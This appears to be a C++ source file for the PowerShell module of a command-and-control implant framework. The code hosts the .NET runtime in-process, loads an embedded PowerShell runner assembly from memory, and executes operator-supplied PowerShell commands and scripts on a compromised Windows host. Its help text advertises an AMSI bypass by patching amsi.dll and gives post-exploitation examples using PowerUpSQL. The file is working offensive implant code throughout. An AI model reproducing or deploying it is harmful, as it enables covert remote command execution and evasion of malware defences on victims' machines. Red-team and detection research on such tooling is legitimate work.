#include "Powershell.hpp"

#include <cstring>
#include <array>

#ifdef _WIN32

#pragma comment(lib, "mscoree.lib")

using namespace mscorlib;

#endif

#include "Common.hpp"


using namespace std;


constexpr std::string_view moduleName = "powershell";
constexpr unsigned long moduleHash = djb2(moduleName);

#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
const std::string ScriptsDirectoryFromTeamServer = "../Scripts/";
#endif

#ifdef _WIN32

__declspec(dllexport) Powershell* PowershellConstructor() 
{
    return new Powershell();
}


typedef HRESULT(WINAPI *funcCLRCreateInstance)(
	REFCLSID  clsid,
	REFIID     riid,
	LPVOID  * ppInterface
	);

typedef HRESULT (WINAPI *funcCorBindToRuntime)(
	LPCWSTR  pwszVersion,
	LPCWSTR  pwszBuildFlavor,
	REFCLSID rclsid,
	REFIID   riid,
	LPVOID*  ppv);


extern const unsigned int PowerShellRunner_dll_len;
extern unsigned char PowerShellRunner_dll[];
void InvokeMethod(_TypePtr spType, wchar_t* method, wchar_t* command);


bool createDotNetFourHost(HMODULE* hMscoree, const wchar_t* version, ICorRuntimeHost** ppCorRuntimeHost)
{
	HRESULT hr = NULL;
	funcCLRCreateInstance pCLRCreateInstance = NULL;
	ICLRMetaHost *pMetaHost = NULL;
	ICLRRuntimeInfo *pRuntimeInfo = NULL;
	bool hostCreated = false;

	pCLRCreateInstance = (funcCLRCreateInstance)GetProcAddress(*hMscoree, "CLRCreateInstance");
	if (pCLRCreateInstance == NULL)
	{
		// wprintf(L"Could not find .NET 4.0 API CLRCreateInstance");
		goto Cleanup;
	}

	hr = pCLRCreateInstance(CLSID_CLRMetaHost, IID_PPV_ARGS(&pMetaHost));
	if (FAILED(hr))
	{
		// Potentially fails on .NET 2.0/3.5 machines with E_NOTIMPL
		// wprintf(L"CLRCreateInstance failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	hr = pMetaHost->GetRuntime(L"v4.0.30319", IID_PPV_ARGS(&pRuntimeInfo));
	if (FAILED(hr))
	{
		// wprintf(L"ICLRMetaHost::GetRuntime failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	// Check if the specified runtime can be loaded into the process.
	BOOL loadable;
	hr = pRuntimeInfo->IsLoadable(&loadable);
	if (FAILED(hr))
	{
		// wprintf(L"ICLRRuntimeInfo::IsLoadable failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	if (!loadable)
	{
		// wprintf(L".NET runtime v4.0.30319 cannot be loaded\n");
		goto Cleanup;
	}

	// Load the CLR into the current process and return a runtime interface
	hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_PPV_ARGS(ppCorRuntimeHost));
	if (FAILED(hr))
	{
		// wprintf(L"ICLRRuntimeInfo::GetInterface failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}

	hostCreated = true;

Cleanup:

	if (pMetaHost)
	{
		pMetaHost->Release();
		pMetaHost = NULL;
	}
	if (pRuntimeInfo)
	{
		pRuntimeInfo->Release();
		pRuntimeInfo = NULL;
	}

	return hostCreated;
}


HRESULT createDotNetTwoHost(HMODULE* hMscoree, const wchar_t* version, ICorRuntimeHost** ppCorRuntimeHost)
{
	HRESULT hr = NULL;
	bool hostCreated = false;
	funcCorBindToRuntime pCorBindToRuntime = NULL;
	
	pCorBindToRuntime = (funcCorBindToRuntime)GetProcAddress(*hMscoree, "CorBindToRuntime");
	if (!pCorBindToRuntime)
	{
		// wprintf(L"Could not find API CorBindToRuntime");
		return hostCreated;
	}

	hr = pCorBindToRuntime(version, L"wks", CLSID_CorRuntimeHost, IID_PPV_ARGS(ppCorRuntimeHost));
	if (FAILED(hr))
	{
		// wprintf(L"CorBindToRuntime failed w/hr 0x%08lx\n", hr);
		return hostCreated;
	}

	hostCreated = true;

	return hostCreated;
}

HRESULT createHost(const wchar_t* version, ICorRuntimeHost** ppCorRuntimeHost)
{
	bool hostCreated = false;

	HMODULE hMscoree = LoadLibrary("mscoree.dll");
	
	if (hMscoree)
	{
		if (createDotNetFourHost(&hMscoree, version, ppCorRuntimeHost))
		{
			hostCreated = true;
		}
		else if (createDotNetTwoHost(&hMscoree, version, ppCorRuntimeHost))
		{
			hostCreated = true;
		}
	}
	
	return hostCreated;
}

#else

__attribute__((visibility("default"))) Powershell* PowershellConstructor() 
{
    return new Powershell();
}

#endif

Powershell::Powershell()
#ifdef BUILD_TEAMSERVER
	: ModuleCmd(std::string(moduleName), moduleHash)
#else
	: ModuleCmd("", moduleHash)
#endif
{
	m_firstRun=true;
}

Powershell::~Powershell()
{
#ifdef _WIN32
	if (pCorRuntimeHost)
	{
		pCorRuntimeHost->Release();
		pCorRuntimeHost = NULL;
	}
#endif
}

std::string Powershell::getInfo()
{
	std::string info;
#ifdef BUILD_TEAMSERVER
	info += "Powershell:\n";
	info += "Execute a powershell command.\n";
	info += "To be sure to get the output of the commande do 'cmd | write-output'.\n";
	info += "You can import module using -i, added as New-Module at every execution.\n";
	info += "You run scripts using -s.\n";
	info += "AMSI bypass by patching the amsi.dll will work once for all.\n";
	info += "exemple:\n";
	info += " - powershell whoami | write-output\n";
	info += " - powershell import-module PowerUpSQL.ps1; Get-SQLConnectionObject\n";
	info += " - powershell -i /tmp/PowerUpSQL.ps1 \n";
	info += " - powershell -s /tmp/script.ps1 \n";
#endif
	return info;
}


int Powershell::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
	if(splitedCmd.size()<2)
	{
		c2Message.set_returnvalue(getInfo());
		return -1;
	}

	string shellCmd;
	for (int i = 1; i < splitedCmd.size(); i++)
	{
		shellCmd += splitedCmd[i];
		shellCmd += " ";
	}

	if(splitedCmd[1]=="-i" || splitedCmd[1]=="-s")
	{
		std::string inputFile;
		if(splitedCmd.size()>=3)
			inputFile=splitedCmd[2];

		std::ifstream myfile;
		myfile.open(inputFile, std::ios::binary);

		if(!myfile)
		{
			std::string newInputFile=ScriptsDirectoryFromTeamServer;
			newInputFile+=inputFile;
			myfile.open(newInputFile, std::ios::binary);
			inputFile=newInputFile;
		}

		if(!myfile) 
		{
			std::string msg = "Couldn't open file.\n";
			c2Message.set_returnvalue(msg);
			return -1;
		}

		std::string payload(std::istreambuf_iterator<char>(myfile), {});
		c2Message.set_inputfile(inputFile);
		c2Message.set_data(payload.data(), payload.size());

		myfile.close();
	}

	c2Message.set_instruction(splitedCmd[0]);
	c2Message.set_cmd(shellCmd);
#endif
	return 0;
}


int Powershell::process(C2Message &c2Message, C2Message &c2RetMessage)
{
	string cmd = c2Message.cmd();

	std::vector<std::string> splitedCmd;
    splitList(cmd, " ", splitedCmd);

	if(!splitedCmd.empty())
	{
		if(splitedCmd[0]=="-i")
		{
			const std::string buffer = c2Message.data();
			std::string finalCmd = "New-Module -ScriptBlock {\n";
			finalCmd+=buffer;
			finalCmd +="\nExport-ModuleMember -Function * -Alias *;};";

			m_modulesToImport+=finalCmd;

			std::string outCmd = execPowershell(m_modulesToImport);
			c2RetMessage.set_instruction(c2RetMessage.instruction());
			c2RetMessage.set_cmd(cmd);
			c2RetMessage.set_returnvalue(outCmd);
			return 0;

		}
		if(splitedCmd[0]=="-s")
		{
			const std::string buffer = c2Message.data();
			std::string finalCmd = m_modulesToImport;
			finalCmd += "Invoke-Command -ScriptBlock  {\n";
			finalCmd += buffer;
			finalCmd += "};";

			std::string outCmd = execPowershell(finalCmd);
			c2RetMessage.set_instruction(c2RetMessage.instruction());
			c2RetMessage.set_cmd(cmd);
			c2RetMessage.set_returnvalue(outCmd);
			return 0;
		}
	}

	std::string finalCmd = m_modulesToImport;
	finalCmd += cmd;

	std::string outCmd = execPowershell(finalCmd);

	c2RetMessage.set_instruction(c2RetMessage.instruction());
	c2RetMessage.set_cmd(cmd);
	c2RetMessage.set_returnvalue(outCmd);

	return 0;
}


#ifdef _WIN32

int Powershell::initCLR(std::string& result)
{
	HRESULT hr;
	IUnknownPtr spAppDomainThunk = NULL;
	_AppDomainPtr spDefaultAppDomain = NULL;

	// The .NET assembly to load.
	bstr_t bstrAssemblyName("PowerShellRunner");
	_AssemblyPtr spAssembly = NULL;

	// The .NET class to instantiate.
	bstr_t bstrClassName("PowerShellRunner.PowerShellRunner");
	// _TypePtr spType = NULL;

	// Create the runtime host
	if (!createHost(L"v4.0.30319", &pCorRuntimeHost))
	{
		result+="Failed to create the runtime host\n";
		return -1;
	}

	
	// Start the CLR
	hr = pCorRuntimeHost->Start();
	if (FAILED(hr))
	{
		result+="CLR failed to start.\n";
		return -1;
	}


	DWORD appDomainId = NULL;
	hr = pCorRuntimeHost->GetDefaultDomain(&spAppDomainThunk);
	if (FAILED(hr))
	{
		result+="RuntimeClrHost::GetCurrentAppDomainId failed.\n";
		return -1;
	}


	// Get a pointer to the default AppDomain in the CLR.
	hr = pCorRuntimeHost->GetDefaultDomain(&spAppDomainThunk);
	if (FAILED(hr))
	{
		result+="ICorRuntimeHost::GetDefaultDomain failed.\n";
		return -1;
	}

	hr = spAppDomainThunk->QueryInterface(IID_PPV_ARGS(&spDefaultAppDomain));
	if (FAILED(hr))
	{
		result+="Failed to get default AppDomain.\n";
		return -1;
	}

	// Load the .NET assembly.
	// (Option 1) Load it from disk - usefully when debugging the PowerShellRunner app (you'll have to copy the DLL into the same directory as the exe)
	// hr = spDefaultAppDomain->Load_2(bstrAssemblyName, &spAssembly);
	
	// (Option 2) Load the assembly from memory
	SAFEARRAYBOUND bounds[1];
	bounds[0].cElements = PowerShellRunner_dll_len;
	bounds[0].lLbound = 0;

	SAFEARRAY* arr = SafeArrayCreate(VT_UI1, 1, bounds);
	SafeArrayLock(arr);
	memcpy(arr->pvData, PowerShellRunner_dll, PowerShellRunner_dll_len);
	SafeArrayUnlock(arr);

	hr = spDefaultAppDomain->Load_3(arr, &spAssembly);

	if (FAILED(hr))
	{
		result+="Failed to load the assembly.\n";
		return -1;
	}

	// Get the Type of PowerShellRunner.
	hr = spAssembly->GetType_2(bstrClassName, &spType);
	if (FAILED(hr))
	{
		result+="Failed to get the Type interface.\n";
		return -1;
	}

	return 0;
}

#endif


std::string Powershell::execPowershell(const std::string& cmd)
{
	std::string result;

#ifdef __linux__ 


#elif _WIN32

	if(m_firstRun)
	{
		int err = initCLR(result);
		m_firstRun=false;
		if(err!=0)
		{
			if (pCorRuntimeHost)
			{
				pCorRuntimeHost->Release();
				pCorRuntimeHost = NULL;
			}
		}
	}

	if (pCorRuntimeHost)
	{
		wstring wide_string = wstring(cmd.begin(), cmd.end());
		wchar_t* argument = wide_string.data();
		
		InvokeMethod(spType, L"InvokePS", argument, result);
	}

#endif

	return result;
}


#ifdef _WIN32

void Powershell::InvokeMethod(_TypePtr spType, wchar_t* method, wchar_t* command, std::string& result)
{
	HRESULT hr;
	bstr_t bstrStaticMethodName(method);
	SAFEARRAY *psaStaticMethodArgs = NULL;
	variant_t vtStringArg(command);
	variant_t vtPSInvokeReturnVal;
	variant_t vtEmpty;

	psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
	LONG index = 0;
	hr = SafeArrayPutElement(psaStaticMethodArgs, &index, &vtStringArg);
	if (FAILED(hr))
	{
		result+="SafeArrayPutElement failed.";
		return;
	}

	// Invoke the method from the Type interface.
	hr = spType->InvokeMember_3(
		bstrStaticMethodName, 
		static_cast<BindingFlags>(BindingFlags_InvokeMethod | BindingFlags_Static | BindingFlags_Public), 
		NULL, 
		vtEmpty, 
		psaStaticMethodArgs, 
		&vtPSInvokeReturnVal);

	if (FAILED(hr))
	{
		result+="Failed to invoke InvokePS.";
		return;
	}
	else
	{
		wstring ws(vtPSInvokeReturnVal.bstrVal);
		std::string str(ws.begin(), ws.end());
		result += str;
	}

	SafeArrayDestroy(psaStaticMethodArgs);
	psaStaticMethodArgs = NULL;
}

#endif